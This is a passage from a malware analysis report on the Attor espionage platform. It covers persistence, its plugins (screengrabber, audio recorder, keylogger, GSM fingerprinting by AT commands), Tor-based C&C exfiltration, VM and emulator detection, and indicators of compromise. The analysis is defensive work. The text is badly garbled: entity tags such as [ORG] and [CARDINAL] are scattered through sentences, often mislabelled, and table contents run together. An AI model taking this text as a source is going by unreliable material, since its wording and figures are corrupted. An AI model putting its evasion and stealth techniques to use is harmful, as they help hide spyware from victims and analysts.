HKEY_LOCAL_MACHINE\\SYSTEM\\*ControlSet*\\Control\\SafeBoot\\Minimal \u2022 HKEY_LOCAL_MACHINE\\SYSTEM\\*ControlSet*\\Control\\SafeBoot\\NetworkAttor then sets the default value of these subkeys to [ORG] Service , to indicate the malicious service should be loaded during a safe mode boot .Note : In the provided registry keys , * [ORG] ControlSet * represents all registry subkeys with the \u201c [ORG] ControlSet \u201d substring in their names , e.g. ControlSet001 or CurrentControlSet.3.2 [PRODUCT] Collection and exfiltration Several plugins provide espionage capabilities ; we refer to them as the [ORG] Device monitor , [GPE] Screengrabber , [PERSON] Audio recorder and Key / clipboard logger plugins . These plugins store the collected data and log files in a central [GPE] Upload folder .These plugins do not communicate with the [ORG] C&C server themselves . Instead , it is the [ORG] File uploader plugin that automatically uploads these files to the [ORG] C&C server .The main module monitors if there is enough space on the disk where the [ORG] Upload folder is located \u2013 if not , the plugins do not proceed with creating additional files , in order to avoid suspicion by the user .3.3 Network communication There are [CARDINAL] only [CARDINAL] two Attor components that communicate with the [ORG] C&C server : the aforementioned File uploader , and the [ORG] Command dispatcher that downloads commands and additional tools from the [ORG] C&C server .Both plugins use [ORG] FTP ; files are uploaded to / downloaded from an [ORG] FTP server that is protected by credentials hardcoded in the configuration . Passive FTP mode is used , where the client initiates both connections to the server .The malware uses the Tor : Onion Service Protocol , with the [ORG] C&C server having a .onion address , so the communication must be enabled by a Tor client plugin and relayed using a SOCKS proxy plugin . In order to communicate with the [ORG] C&C server , any plugin must [ORDINAL] first establish a connection with the Tor client ( listening on the non - default localhost:8045 ) which is responsible for resolving the onion domain , choosing a circuit and encrypting data in layers .6The Tor client plugin must communicate with the dispatcher , which implements the cryptographic functions . Furthermore , it communicates with the SOCKS proxy ( listening on localhost:5153 ) that relays the communication between the Tor client and the remote server .In total , the infrastructure for [ORG] C&C communication spans [CARDINAL] four Attor components \u2013 the dispatcher providing encryption functions , and [CARDINAL] three plugins implementing the [ORG] FTP protocol , the Tor functionality and the actual network communication . This mechanism is illustrated in Figure [CARDINAL] 4 .FTPID [CARDINAL] 0x06 commandsID 0x05 File uploaderUsesfunctionsID [CARDINAL] 0x06Command dispatcherUsesfunctionsUsesfunctionsID 0x00 [ORG] DispatcherProxy for Windows APIand cryptographic functionsFigure [CARDINAL] 4 // [CARDINAL] Four Attor components cooperate to enable communication with the [ORG] C&C server74 TECHNICAL ANALYSIS In this section , we will provide technical details about the respective Attor components .4.1 Dispatcher The dispatcher , which is a dynamic - link library , is a central unit of the platform . Its name usually starts with letters \u201c SR \u201d , followed by some random letters . Dispatcher names we have seen include [NORP] SRnhm.dll , [NORP] SRSfxu.dll , [GPE] SRzsp.dll , [NORP] SRhhz.dll , [ORG] SRanx.dll and [ORG] sRWobwa.dll . For [CARDINAL] 64 - bit versions , the \u201c x64 \u201d suffix is added to the name , e .g . , [GPE] SRzspx64.dll .The dispatcher contains encrypted configuration data with:\u2022 Paths to working folders ( [ORG] Upload folder , Plugin folder , [ORG] Update folder , [ORG] Resource folder ) \u2022 [ORG] FTP server domain and credentials ( for [ORG] C&C and exfiltration ) \u2022 [ORG] RSA public key \u2022 Name of the service under which the malware should be installedOther components retrieve the configuration data from the dispatcher via a designated interface .The dispatcher injects itself into all processes ( except some system processes and some processes belonging to [NORP] Symantec products ) . Subsequently , it loads all plugins from the Plugin folder ( location of which is determined by the configuration ) .The plugins then use functions implemented by the dispatcher , a reference to which is passed to the plugins on load .There are both 32 - bit and [CARDINAL] 64 - bit versions of the main Attor dispatcher [ORG] DLL . On [CARDINAL] 64 - bit systems , both are loaded , which ensures the malware can inject itself into both 32 - bit and [CARDINAL] 64 - bit processes and monitor them ( e .g . , by taking screenshots and collecting keystrokes ) .4.1.1 Encryption methods Strings in the malware components are protected by an XOR cipher with a hardcoded key2 .The configuration data ( which is embedded in the main module ) , as well as the backdoor commands , are protected by a hybrid encryption scheme , where data is encrypted symmetrically using [NORP] Blowfish and prepended with an [ORG] RSA - encrypted [NORP] Blowfish key .The [NORP] Blowfish cipher is used in [ORG] OFB mode , with a 16 - byte key randomly generated for each message . The public RSA key2 used for encrypting the [NORP] Blowfish key is embedded in the main module .Encryption and decryption methods are implemented by the main module , but are also used by the loadable plugins via the interface provided by the main module ( see [LAW] Section [LAW] 4 .1 .3 ) . Attor \u2019s plugins use the same encryption scheme for encrypting the collected data .4.1.2 Evasion techniques Attor has implemented measures to detect whether it is being executed in an analytical environment . It terminates itself if an emulator or virtual machine is detected .To detect ( some ) emulators , Attor performs [CARDINAL] two similar tests:\u2022 It creates a randomly - named event , and then queries the event name via the NtQueryObject APIfunction .\u2022 It opens the [ORG] HKEY_LOCAL_MACHINE\\SYSTEM registry key and then queries its name by passing the keyhandle to the same API function .2 See the IoCs section for the extracted keys8If there is a mismatch in the names in any of these cases , Attor assumes the presence of an emulator and exits .To detect virtual machines , Attor utilizes the following methods for detecting [ORG] VMware , [ORG] VirtualBox and [ORG] Virtual [ORG] PC:\u2022 It calls the sldt instruction , which stores the address of [ORG] the [ORG] Local [ORG] Descriptor [ORG] Table in a register ; theaddress should be [CARDINAL] zero on native systems and non - [CARDINAL] zero in [ORG] VMware . This is illustrated in Figure [CARDINAL] 5a .\u2022 It executes an undefined instruction vpcext that is valid in [GPE] Virtual PC and [ORG] VirtualBox environments , but will generate an exception if executed in a native environment . This is illustrated in Figure [CARDINAL] 5b .\u2022 It attempts to retrieve the [ORG] VMware version by communicating with I / O ports , using the ininstruction . If called in a [ORG] VMware environment with the parameters seen in Figure [CARDINAL] 5c , the magic value VMXh is returned as the result .\u2022 It tries to read from the \\\\.\\VBoxMiniRdrDN pseudo - device , to discover whether it is running inVirtualBox . This is illustrated in Figure [CARDINAL] 5d .Figure [CARDINAL] 5 // Attor employs several techniques to detect specific virtual environmentsFurthermore , Attor uses other techniques to avoid [ORG] detection:\u2022 [ORG] Network communication plugins are injected into applications such as web browsers or [ORG] IMapplications , in order to blend in with legitimate network traffic .\u2022 To prevent suspicion , whenever Attor manipulates a file or a registry key , it then restores the originalvalues of their last access time .\u2022 All files created by Attor have the hidden , system and archive attributes set in order to be hidden fromWindows Explorer by default .94.1.3 Interface for plugins Attor \u2019s plugins use functions implemented by the main module , which makes them harder to detect and analyze , because they call functions of the dispatcher instead of Windows API functions .The functions are called using the function dispatcher , which takes as its arguments the function type and its numerical identifier . Figure [CARDINAL] 6 illustrates a part of [CARDINAL] one plugin , calling the function dispatcher on several occasions . In the disassembly on the right , we replaced the numeric identifiers with descriptive names , that we recovered by reverse - engineering the dispatcher .A reference to the function dispatcher is passed to the plugin on load . Since the plugins are loaded into the same process as the dispatcher , they share the same address space , and thus the plugins can call the functions of the dispatcher [ORG] DLL directly . This design makes it harder to analyze individual components of Attor without access to the dispatcher , which translates the specified identifier to a meaningful function that is then executed .Figure [CARDINAL] 6 // Additional plugins use functions implemented in the main module , by calling the function dispatcher ( dubbed helperFnc here)10According to our analysis , the dispatcher implements [CARDINAL] three [CARDINAL] to [CARDINAL] four [CARDINAL] dozen functions , depending on the dispatcher version ( new functions are included in the newer samples ) . Table [CARDINAL] 1 lists functions recovered across all samples examined .Table [CARDINAL] 1 // The interface provided by the dispatcher DLLsFunction typeFunction IDFunctionality1 ( resource manipulation [PERSON] functions)2 ( cryptographic the [NORP] Blowfish - encrypted dataGenerate an [ORG] RSA keyHash data ( SHA-1 or MD5)Hash data \u2013 init part ( SHA-1 or [CARDINAL] MD5)Overwrite a memory block with null bytesHash data \u2013 update part ( SHA-1 or MD5)Hash data \u2013 final part ( SHA-1 or [PERSON] MD5)Hybrid encryption \u2013 generate a [NORP] Blowfish key , encrypt it with [ORG] RSA and then encrypt the data with [NORP] Blowfish in [ORG] OFB mode11Function typeFunction IDFunctionality3 ( retrieving configuration data and global variables)1234567891011121314Get path to the [ORG] Upload folder ( from the config)Get path to the [ORG] Update folder ( from the config)Get path to the Plugin folder ( from the config)Get path to the [ORG] Resource folder ( from the config)Get 16 hardcoded bytesGet attributes of ntdll .dll file ( to be used for forging file timestamps)Change file timestamps to those of ntdll .dll fileCheck if there is enough space on diskGet FTP directory name ( from the config)Get user ID ( from the config)Get structure with global variables and configuration dataGet user security descriptorGet the specified config fieldResolve import4.2 Shared resources Instrumental for synchronization between the main module and plugins is a set of [CARDINAL] four central folders , where various resources are stored .The precise locations are hardcoded in Attor \u2019s configuration ; most often we have seen the patterns in [LAW] Table [LAW] 2 used for naming these folders ( x represents a variable lower - case letter ) .Table [CARDINAL] 2 // Naming convention for the foldersFolder typeNaming patternPlugin folderUpdate folder%ALLUSERSPROFILE%\\Oracle\\Java\\.NET35\\sxx%ALLUSERSPROFILE%\\Oracle\\Java\\.NET35\\vxxResource folder%ALLUSERSPROFILE%\\Oracle\\Java\\.NET35\\kxxUpload folder%ALLUSERSPROFILE%\\Oracle\\Java\\.NET35\\dxx4.2.1 Plugin folder , [ORG] Update folder All plugins are permanently stored \u2013 compressed and encrypted \u2013 in the Plugin folder . The dispatcher loads plugins from this folder on each execution .The Update folder serves as a temporary store for additional files the attacker wants to execute on the compromised machine . The files get pushed to this folder via the [ORG] Command dispatcher plugin ; once the dispatcher recognizes a [ORG] DLL in the [ORG] Update folder , it loads it automatically , and deletes it afterwards . According to the artifacts in the dispatcher , the thread responsible for this functionality is called Update_th ; thus , we believe this mechanism most likely is used for updating Attor \u2019s components .124.2.2 Upload folder The [ORG] Upload folder is used , by the plugins tasked with collection , as a central folder to store collected data , and by other plugins to store log files .The File uploader plugin automatically uploads these files to the [ORG] C&C server . Each file contains control data including plugin ID , file creation timestamp and a control flag [CARDINAL] 3ff3 and is encrypted using [NORP] Blowfish - OFB combined with [ORG] RSA . The hidden , system and archive attributes of the log files are set ; the last access time is faked .RSA encryptionRandom 16(cid:22)byte Blow\ufb01sh keyBlow\ufb01sh(cid:12)OFB encryptionTimestamp\u201c3(cid:5)3 \u201d \ufb02agPlugin IDDataFigure 7 // Hybrid encryption scheme used by [ORG] AttorAdditionally , index files are used to keep track of log files \u2013 they store the number of log files of a certain group , and the counter values are then used to name the log files .Plugins usually store data in subdirectories of the [ORG] Upload folder named by the plugin ID .Filenames are derived from user names , collected data ( such as clipboard contents or device information ) , timestamp or counter value , and are mostly hexadecimal values .13Table [CARDINAL] 3 // The properties of the files in the [ORG] Upload folderFilename patternPlugin IDFile content1.<device - hash>\\nm\\index.dat1.<device - hash>\\<counter><data - hash>1.<device - hash>\\<counter><data - hash><data - hash>1.<com - device - hash>\\nm\\index.dat1.<com - device - hash>\\<counter><data - hash>2.<user - name - hash>\\nm\\index.dat2.<user - name - hash>\\<counter><data - hash>7\\nm\\info7\\nm\\index.dat7\\<counter><data - hash > nm\\0_skp_<user - name>\\index.dat0_skp_<variable - data>111112277733Index file for storage device metadataStorage device information ( bus type , device type , total disk size , [PERSON] TrueCrypt version . . .)Information about documents stored on the device ( name , size , creation [ORG] & last modified [PERSON] time)Index file for COM device metadataCOM device information ( information about the phone/ modem , information about the subscriber)Index file for screenshotsScreenshot fileHash of last - stored clipboard dataIndex file for keylog / clipboard [DATE] filesKeylog / clipboard dataIndex file for audio recordingsAudio recording fileNote : We only analyzed the older version of the plugin with ID 0x03 . The file paths may be slightly different in the newer version , i.e. , the one with the modern architecture.4.2.3 Resource folder This folder is used by all plugins to store miscellaneous resources that are not to be exfiltrated to the [ORG] C&C server , such as scripts , timestamps or temporary files .4.3 Plugins Attor \u2019s architecture allows customization for individual targets , where the functionality of the platform relies heavily on plugins deployed on the compromised machine .The plugins are implemented as DLLs , loaded by the dispatcher . They are stored on the disk in a compressed and encrypted form , with the valid form of the [ORG] DLL only being recovered in memory , when the dispatcher loads the plugin . This probably is an attempt to thwart detection , as the plugin DLLs are never present unencrypted on disk .All plugins export the same set of functions : DllCanUnloadNow , DllGetClassObject , DllRegisterServer , [GPE] DllUnregisterServer , DllEntryPoint . When the dispatcher loads a plugin ( DllEntryPoint ) , a start event is created , and several threads with the payload are started , which all wait until the event is signaled .14Figure [CARDINAL] 8 // DllGetClassObject export of a plugin that is responsible for initialization and starting the actual payloadThe plugins are activated by the main [ORG] DLL calling the DllGetClassObject export ( see Figure 8) with the following actions happening:\u2022 The main [ORG] DLL passes a reference to the helper function of the dispatcher , which the plugin will use forretrieving configuration data , for file manipulation , for encryption / decryption \u2026 \u2022 The start event is signaled , which activates the threads \u2022 The plugin returns the plugin ID and version , so that the main [ORG] DLL can keep track of the activemodulesThe version information of plugins recovered in the course of our investigation , along with the plugins \u2019 functionality , is listed in [LAW] Table [LAW] 4 [LAW] .15Table [LAW] 4 // The analyzed plugins and their versionsPlugin IDAnalyzed versions0x0E(no version ) , [CARDINAL] 0x0C0x010x020x030x050x060x070x0D0x10FunctionalityDevice monitorScreengrabber(no version ) , [CARDINAL] 0x08 , 0x09 , [DATE] 0x0B , [CARDINAL] 0x0CAudio recorder0x0A0x0AFile uploaderCommand dispatcher / SOCKS proxy0x02 , [DATE] 0x04 , 0x09 , 0x0AKey / clipboard logger0x030x01Tor clientInstaller / watchdogNote that if the numbering is continuous ( which it might be , since [DATE] 0x10 is the last we have seen and is only version [CARDINAL] 1 , while e .g . , 0x03 is now on version 0x0C ) , there may be additional plugins available that we have n\u2019t seen .We only can guess what functionality those plugins unknown to us might have . If we are to speculate , we feel that missing is a remote shell functionality , and also functionality to exfiltrate specific files silently ; there may also be more victim - specific plugins available .4.3.1 Device monitor ( ID 0x01 ) The most curious plugin in Attor \u2019s arsenal collects information about connected modem / phone devices and connected storage drives , and about files present on these drives . It is responsible for collection of metadata , not the files themselves , so we consider it a plugin used for device fingerprinting , used as a base for further data theft .The Device monitor plugin creates a new window and uses SHChangeNotifyRegister API to register [ORG] Shell - level notifications for that window on storage media insertion / removal , with a custom window message 0x421 . The window procedure handles these events , and [PERSON] WM_DEVICECHANGE message , and collects a specific set of information for either a modem or a phone device , or an external storage drive . [CARDINAL] 1 . External storage drive In case a hard disk device is inserted , Device monitor collects the following information:\u2022 Bus type , device type , device type modifier , vendor ID , product ID , product revision string , serialnumber , device interfaces\u2022 Free space on disk , total disk size , filesystem used \u2022 If applicable , also [ORG] TrueCrypt [ORG] versionThe [ORG] TrueCrypt version is determined by sending IOCTLs to the [PERSON] TrueCrypt driver ( 0x222004 ( TC_IOCTL_GET_DRIVER_VERSION ) and [PERSON] 0x72018 ( TC_IOCTL_LEGACY_GET_DRIVER_VERSION ) ) . As these are [ORG] TrueCrypt - specific control codes , not standard codes , the authors of the malware must have been familiar with the code of the [PERSON] TrueCrypt driver , or [PERSON] TrueCrypt installer . This technique is very rare .16Figure [CARDINAL] 9 // Device monitor plugin sends non - standard , [ORG] TrueCrypt - specific control codes to the [PERSON] TrueCrypt driver , in order to determine the [PERSON] TrueCrypt versionFurther , it scans these hard disk devices for specific files and collects information about these files . It collects metadata such as filename , file size , creation and last - modified time of documents having the target extensions : .xls , .xlsx , .xlsm , .doc , .docx , .docm , .ppt , and .pptx .The information gathered by this plugin is stored in separate log files in the [ORG] Upload folder , in order to be exfiltrated by another plugin .2 . [ORG] GSM / [PERSON] GPRS modem / phone device The more unusual functionality of this plugin is the ability to fingerprint GSM devices . Whenever a modem or a phone device is connected to the [ORG] COM port , Device monitor uses AT commands to communicate with the device , via the associated serial port .AT commands , also known as [PERSON] Hayes command set , were originally developed in [DATE] the [DATE] 1980s to command a modem to dial , hang up or change connection settings . The command set was subsequently extended to support additional functionality , both standardized and vendor - specific .17In a recent paper , it was discovered that the commands are still in use in most modern smartphones . The researchers were able to bypass security mechanisms and communicate with the smartphones using AT commands through their [ORG] USB interface . [CARDINAL] Thousands of commands were recovered and tested , including those to send SMS messages , push touch events , or leak sensitive information .This research illustrates that the old - school AT commands pose a serious risk when misused .As for Attor \u2019s plugin , however , we may only speculate why AT commands are employed . We have detected a [CARDINAL] 64 - bit version of this plugin in [DATE] 2019 , and we can confirm it is still a part of the modernized Attor platform ( that we [ORDINAL] first saw in [DATE] 2018 ) . On the other hand , it seems unlikely it is targeting modern smartphone devices . The plugin ignores devices connected via a [ORG] USB port , and only contacts those connected via a serial port ( more precisely , devices with \u201c COM * \u201d in the friendly name ) .A more likely explanation of the plugin \u2019s main motive is that it targets modems and older phones . Alternatively , it may be used to communicate with some specific devices ( used by the victim or target organization ) that are connected to the [ORG] COM port or to the [ORG] USB port using a [ORG] USB - to - serial adaptor . In this scenario , it is possible the attackers have learned about the victim \u2019s use of these devices using some other reconnaissance techniques .In any case , the plugin retrieves the following information from the connected devices , using the AT commands listed in [ORG] Table [ORG] 5:\u2022 Basic information about the mobile phone or [ORG] GSM / [ORG] GPRS modem : name of manufacturer , modelnumber , [ORG] IMEI number and software version\u2022 Basic information about the subscriber : [ORG] MSISDN and [ORG] IMSI numberTable [CARDINAL] 5 // The commands of the AT protocol used by the [ORG] Device monitor [ORG] pluginAT commandFunctionalityATSignals start of communication ( AT for attention ) .AT+MODE=2Prepares the phone for an extended AT+ command set .AT+CGSNRequests [ORG] IMEI number ( [ORG] International [ORG] Mobile [ORG] Equipment [ORG] Identity ) , which is a unique number to identify a device .AT+CGMMRequests information about the model of the device ( model number ) .AT+CGMIAT+CGMRAT+CNUMAT+CIMIRequests name of the device manufacturer .Requests the version of the software loaded on the device .Requests [ORG] MSISDN ( [ORG] Mobile [ORG] Station [ORG] International [ORG] Subscriber [ORG] Directory [ORG] Number ) , which is the mapping of the telephone number to the subscriber identity module in a mobile or cellular phone .Requests IMSI ( International Mobile Subscriber Identity ) , which is a unique number identifying a [ORG] GSM subscriber . This number has [CARDINAL] two parts . The initial part is comprised of [CARDINAL] six digits in the [NORP] North [NORP] American standard and [CARDINAL] five digits in the [NORP] European standard . It identifies the [ORG] GSM network operator in a specific country with whom the subscriber holds an account . The [ORDINAL] second part is allocated by the network operator to uniquely identify the subscriber .Note that many more ( vendor - specific ) AT commands exist that are not used by this plugin . It is possible that malware operators use the listed commands to fingerprint the connected devices , and then deploy another plugin with more - specific commands to extract information from the device .184.3.2 Screengrabber ( ID 0x02 ) This plugin captures screenshots of targeted applications and stores them encrypted in the [ORG] Upload folder . It is only activated in applications of the attackers \u2019 choice , determined by the process name .After activation , the [PERSON] Screengrabber monitors the application \u2019s foreground window and if it is a web browser with a specific window title , or if it is another from the list of target applications , captures a screenshot [TIME] every [TIME] 10 [TIME] seconds . For example , the plugin takes a screenshot if the victim is using an email client or has opened an email attachment .Targeted are mostly web browsers , including all major ( Firefox , [ORG] Opera , [ORG] Chrome , [PERSON] Safari , Internet Explorer ) and a few less popular ( Maxthon , [ORG] Avant , [ORG] SeaMonkey ) ones . By checking the window title of the web browser , the malware can determine whether the user is visiting a website of interest .We have encountered process names and window titles referring to these services:\u2022 Social networks and blogging platforms ( Facebook , Twitter , Google+ , Blogger , [ORG] Livejournal ) \u2022 Email services ( [PERSON] Gmail , [ORG] AOL [ORG] Mail , [GPE] Hotmail , Hotbox , Webmail , Yahoo ! Mail ) \u2022 Office software ( MS Word , Powerpoint , Excel , Visio , Notepad , Notepad++ , [PERSON] Wordpad ) \u2022 Archiving utilities ( WinRAR , WinZip , Hamster ) \u2022 Cloud storage and file sharing services ( Turbobit , Skydrive , [ORG] RapidShare ) \u2022 Messaging , VoIP applications and web - based messaging services ( Skype , [ORG] Viber , Miranda , Pidgin , [ORG] QIP , [CARDINAL] qutIM)Apart from these widely used applications , the list contains a number of irregularities , which can give us more insight about the intended victims .For example , having [ORG] TrueCrypt on the list suggests that the attackers are specifically interested in privacy - conscious users . Also targeted are encryption / digital signature utilities , a [ORG] VPN application ( HMA VPN ) , secure mail clients ( The [PERSON] Bat ! and [ORG] HushMail ) and a secure web browser ( Dragon ) .Furthermore , the applications on the list show the attackers are targeting [LANGUAGE] Russian - speaking users \u2013 which is also confirmed by the geographical distribution of Attor , as explained in [LAW] Section [LAW] 2 . The strings from the list of services targeted by the Screengrabber , that support this claim , are documented in [DATE] Table [DATE] 6 .Table 6 // Artifacts from Attor \u2019s [ORG] Screengrabber associated with [NORP] Russian applicationsProcess name / window title substringContext\u041e\u0414\u041d\u041e\u041a\u041b\u0410\u0421\u0421\u041d\u0418\u041a\u0418 ( transl . Classmates)Russian social network ( Odnoklassniki)AGENTVKONTAKTEWEBMONEYRussian social network ( [GPE] VKontakte)Online payment system used in [GPE] Russia ( WebMoney)MAIL .YANDEX , \u042f\u041d\u0414\u0415\u041a\u0421 .\u041f\u041e\u0427\u0422\u0410 ( transl . Yandex .Mail ) , MAIL .RU , [ORG] POCHTA ( transl . Mail ) , [NORP] MAGENTRussian email services ( Mail.ru , Yandex . Mail)\u041f\u0420\u0418\u0413\u041b\u0410\u0428\u0415\u041d\u0418\u0415 \u0414\u0420\u0423\u0416\u0418\u0422\u042c ( transl . [PERSON] Friend [PERSON] request)Russian text\u0412\u0410\u041c [ORG] \u0421\u041e\u041e\u0411\u0429\u0415\u041d\u0418\u0415 ( transl . Message for you)Russian [PERSON] textMULTIFONQIP , [ORG] INFIUMRAMBLERRussian [ORG] VoIP [ORG] serviceRussian [ORG] IM application ( [NORP] QIP)Russian search engine ( Rambler)19Interestingly , the list of targeted applications contains some services that are now defunct or [DATE] less [DATE] popular [DATE] than [DATE] 10 [DATE] years [DATE] ago , which may suggest that the Attor platform is much older than we think .4.3.3 Audio recorder ( ID 0x03 ) This plugin creates audio recordings using available microphones and stores them encrypted in the [ORG] Upload folder .The plugin is only activated if executed within a process of a teleconferencing application , which is determined by comparing the process name against a hardcoded list that includes Skype , [ORG] Facebook [ORG] Video [ORG] Calling , [PERSON] Brosix or Cheap VoIP .This may indicate the attackers are interested in eavesdropping on online calls .With this mechanism , the attackers can also record the victim \u2019s conversations outside of teleconferencing apps . In this case , running in a process of a teleconferencing application can be an attempt to stay undetected , as the user is less likely to become suspicious that these applications access the microphone device .4.3.4 File uploader ( ID 0x05 ) The [ORG] File uploader plugin is responsible for exfiltration of collected data and log files to the [ORG] C&C server .The files are uploaded to the [ORG] C&C server automatically , in batches . Files are uploaded in [ORG] FTP passive mode , as binary content , and are deleted from the [ORG] Upload folder after the exfiltration .The [ORG] C&C server and credentials are hardcoded in the configuration data ; these credentials were used in all the collected plugins:\u2022 [ORG] C&C server : \u201c idayqh3zhj5j243 t [ .]onion \u201d \u2022 username : \u201c do \u201d \u2022 password : [ Redacted]The plugin logs in to the [ORG] FTP server and copies the contents of the upload directory to a directory on the [ORG] FTP server hardcoded in the config , creating a subdirectory there , with the victim ID as its name .In order to reach out to the [ORG] C&C server in the [ORG] Tor network , the [ORG] File uploader plugin uses other plugins ( [CARDINAL] 0x0D and [CARDINAL] 0x06 ) that provide the Tor and SOCKS proxy functionality ( see Figure [CARDINAL] 4 . Network communication .)The File uploader plugin is only activated if running within the process of a web browser or an instant messaging application or other network applications ( this is determined by checking the process name against a hardcoded list ) . This trick hides the exfiltration - related network communication in a stream of legitimate communication made by that application , and thus reduces the risk of raising any suspicion .4.3.5 Command dispatcher / SOCKS proxy ( ID 0x06 ) This plugin serves [CARDINAL] two purposes .First , it serves as a SOCKS proxy , used by the Tor client plugin ( ID 0x0D ) to communicate with the remote computer .Second , it downloads commands from the [ORG] C&C server and interprets them .Just as with other plugins involved in [ORG] C&C communication , [ORG] Command dispatcher also hides its network communication using the trick described in [LAW] Section [LAW] 4 .3 .4 .The Command dispatcher plugin communicates with the [ORG] C&C server via the [ORG] FTP protocol using the [FAC] 0x0D plugin ( with Tor ) ; the credentials are the same as those used by the [ORG] File uploader plugin for exfiltration .20After the communication is established , [ORG] Command dispatcher downloads a file called WAND.bin from the server , decrypts it ( [ORG] RSA + [NORP] Blowfish ) and parses the commands using the CommandLineToArgW API function .The plugin supports [CARDINAL] four commands , as listed in [LAW] Table [LAW] 7 .Table [CARDINAL] 7 // [ORG] Commands supported by Attor \u2019s [ORG] Command dispatcher pluginCommand nameFunctionalitySETMOVEDELETECOPYSet the value of an internal variableRename a local fileDelete a local fileDownload a file from the [ORG] FTP server to the specified locationOf interest is the [ORG] COPY command serves as a mechanism for the malware to download additional resources , [PERSON] namely:\u2022 [PERSON] New plugins that will be stored in the Plugin folder and loaded by the main module on its nextexecution\u2022 Updates that will be stored in the [ORG] Updates folder and immediately loaded and then deleted by thedispatcher\u2022 Miscellaneous files that will be stored in the [ORG] Resource folder \u2022 New versions of the dispatcher , either 32 - bit or [CARDINAL] 64 - bitCommand dispatcher stores encrypted log data containing status / results of the executed commands in the [ORG] Upload folder , and timestamp of the last time the [ORG] C&C server was contacted , in the [ORG] Resource folder .4.3.6 Key / clipboard logger ( ID 0x07 ) This plugin steals clipboard data , and collects keystrokes pressed within the process in which the [ORG] DLL is injected .Due to the fact the dispatcher injects itself into all running processes , and then loads additional plugins , this logger \u2019s [ORG] DLL will be loaded into all processes as well .This plugin scans the content of the clipboard and whenever a change is detected , it stores the data in a log file . It is only concerned with user [ORG] GUI desktop ( \u201c WinSta0 \u201d ) and [ORG] UNICODE format clipboard data ( i .e . , not files , objects etc . ) .For keylogging , this plugin installs a hook function to the window of the current process that has the keyboard focus . To avoid detection , it uses a less common technique : instead of hooking [PERSON] WH_KEYBOARD or WH_KEYBOARD_LL , it hooks [ORG] WH_GETMESSAGE . Whenever the window receives [ORG] WM_CHAR or [GPE] WM_KEYDOWN message , the plugin translates the pressed keystrokes into text .The collected clipboard and keyboard data are stored in encrypted files in the [ORG] Upload folder .4.3.7 Tor client ( ID 0x0D ) This plugin is based on the Tor client , customized to the design of this malware ( tor.exe with added interaction with Attor \u2019s dispatcher ) .It is responsible for computations , such as choosing a random circuit and providing multilayer encryption , and for establishing the communication with the [ORG] Tor network by resolving the onion hostname .21For the actual network communication , it utilizes the SOCKS proxy implemented by plugin [CARDINAL] 0x06 .The attackers use Tor for [ORG] C&C communication and exfiltration for anonymity and untraceability . Also , the Tor client plugin hides its network communication using the trick described in [LAW] Section [LAW] 4 .3 .4 .4.3.8 Installer / watchdog ( ID 0x10 ) This plugin establishes and monitors persistence of the main module .It schedules a task that loads the main module with each system start or each user logon ( depending on the process privileges ) . It then continues to monitor whether the task is still scheduled ; if not , the plugin will reschedule it .To run with necessary privileges , the [ORG] Installer / watchdog plugin is only activated if injected into one of the following processes:\u2022 % system%\\ * \u2022 % windir%\\explorer.exe \u2022 % windir%\\regedit.exe To make the task scheduling functionality stealthier , it does n\u2019t utilize API calls ; instead , it is implemented using the [ORG] ITaskScheduler [ORG] COM interface , registered using XML specification .5 CONCLUSION Attor is an espionage platform , used for highly targeted attacks , and has flown under the radar successfully since [DATE] 2013 .Attor is professionally written malware with a loadable plugin architecture that can be used to customize the functionality to specific targets . It implements mechanisms for automated data collection and exfiltration , as well as for pushing additional plugins to the compromised machine .Its functionality includes an unusual plugin for [ORG] GSM fingerprinting that utilizes a rarely used AT command set . Attor incorporates Tor with the aim of anonymity and untraceability , and scatters the network communication functionality among several components , to make analysis rather difficult .We were not able to recover the full operation timeline , nor the initial access vector . The versioning information in the plugins suggests there are other plugins that we have not yet seen . However , our research provides a deep insight into the malware , and suggests that it is well worth further tracking of the operations of the group behind this malware .6 INDICATORS OF COMPROMISE ( IOCS)ESET detection names Win32 / Attor Win64 / AttorSHA-1 Note : We only present SHA-1 of older - version plugins , which used a simplified architecture and appeared unencrypted on disk.22Dropper idayqh3zhj5j243 t [ .]onion23File - based indicatorsDispatcher filenames SRzspx64.dllPlugin folder paths % COMMONAPPDATA%\\Lenovo\\ImController\\shared\\US - df % COMMONAPPDATA%\\Adobe\\Setup\\Replicate\\US - sf % ALLUSERSPROFILE%\\Oracle\\Java\\.NET35\\sup % ALLUSERSPROFILE%\\Oracle\\Java\\.NetFX\\svn % ALLUSERSPROFILE%\\Oracle\\Java\\.NET35\\sgp % ALLUSERSPROFILE%\\Oracle\\Java\\.NET35\\ssw % ALLUSERSPROFILE%\\Oracle\\Java\\.NET35\\ssm % ALLUSERSPROFILE%\\Sun\\Java\\Java Update\\Caches\\s3xUpload folder paths % COMMONAPPDATA%\\Lenovo\\ImController\\shared\\US - vv % COMMONAPPDATA%\\Adobe\\Setup\\Replicate\\US - nh % ALLUSERSPROFILE%\\Oracle\\Java\\.NET35\\dmx % ALLUSERSPROFILE%\\Oracle\\Java\\.NetFX\\dtr % ALLUSERSPROFILE%\\Oracle\\Java\\.NET35\\dnf % ALLUSERSPROFILE%\\Oracle\\Java\\.NET35\\dtl % [PERCENT] ALLUSERSPROFILE%\\Oracle\\Java\\.NET35\\deu [PERCENT] % ALLUSERSPROFILE%\\Sun\\Java\\Java Update\\Caches\\d5lUpdate folder paths % COMMONAPPDATA%\\Lenovo\\ImController\\shared\\US - fu % COMMONAPPDATA%\\Adobe\\Setup\\Replicate\\US - zn % ALLUSERSPROFILE%\\Oracle\\Java\\.NET35\\vhb % ALLUSERSPROFILE%\\Oracle\\Java\\.NetFX\\vau % ALLUSERSPROFILE%\\Oracle\\Java\\.NET35\\vtt % ALLUSERSPROFILE%\\Oracle\\Java\\.NET35\\vzu24%ALLUSERSPROFILE%\\Oracle\\Java\\.NET35\\vwq % ALLUSERSPROFILE%\\Sun\\Java\\Java [CARDINAL] Update\\Caches\\v1e [ORG] Resource folder paths % COMMONAPPDATA%\\Lenovo\\ImController\\shared\\US - ba % COMMONAPPDATA%\\Adobe\\Setup\\Replicate\\US - pq % ALLUSERSPROFILE%\\Oracle\\Java\\.NET35\\knz % ALLUSERSPROFILE%\\Oracle\\Java\\.NetFX\\kcw % [PERCENT] ALLUSERSPROFILE%\\Oracle\\Java\\.NET35\\kya [PERCENT] % ALLUSERSPROFILE%\\Oracle\\Java\\.NET35\\kub [PERCENT] % ALLUSERSPROFILE%\\Oracle\\Java\\.NET35\\kmm % ALLUSERSPROFILE%\\Sun\\Java\\Java Update\\Caches\\k7fSynchronization object names Note : xx represents a byte expressed in hexadecimal notation ( 